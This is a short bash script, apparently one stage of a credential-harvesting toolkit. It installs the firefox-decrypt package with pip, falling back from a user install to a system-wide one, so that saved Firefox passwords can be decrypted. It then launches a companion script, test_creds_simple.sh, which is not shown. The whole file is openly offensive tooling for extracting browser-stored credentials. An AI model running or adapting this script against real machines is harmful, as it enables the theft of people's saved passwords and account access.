#!/bin/bash
# Enhanced Credential Harvesting with Firefox Decryption
# Attempts to install firefox-decrypt and decrypt passwords

echo "======================================================================"
echo "Credential Harvesting with Firefox Decryption"
echo "======================================================================"
echo ""

# Try to install firefox-decrypt if not available
echo "[*] Checking for firefox-decrypt..."
if ! python3 -c "import firefox_decrypt" 2>/dev/null; then
    echo "[!] firefox-decrypt not found - attempting installation..."
    echo ""
    
    # Try multiple installation methods
    INSTALL_SUCCESS=false
    
    # Method 1: User install
    if python3 -m pip install --user firefox-decrypt 2>&1 | grep -q "Successfully installed"; then
        INSTALL_SUCCESS=true
        echo "✅ Installed firefox-decrypt successfully (user install)"
    fi
    
    # Method 2: Try system-wide if user install failed
    if [ "$INSTALL_SUCCESS" = false ]; then
        if python3 -m pip install firefox-decrypt 2>&1 | grep -q "Successfully installed"; then
            INSTALL_SUCCESS=true
            echo "✅ Installed firefox-decrypt successfully (system install)"
        fi
    fi
    
    if [ "$INSTALL_SUCCESS" = false ]; then
        echo "⚠️  Could not install firefox-decrypt automatically"
        echo "   Install manually with: pip3 install firefox-decrypt"
        echo ""
        echo "   Continuing with encrypted password display..."
        echo ""
    else
        echo ""
    fi
else
    echo "✅ firefox-decrypt is already installed"
    echo ""
fi

# Run the credential harvesting script
echo "[*] Running credential harvesting..."
echo ""
bash "$(dirname "$0")/test_creds_simple.sh"

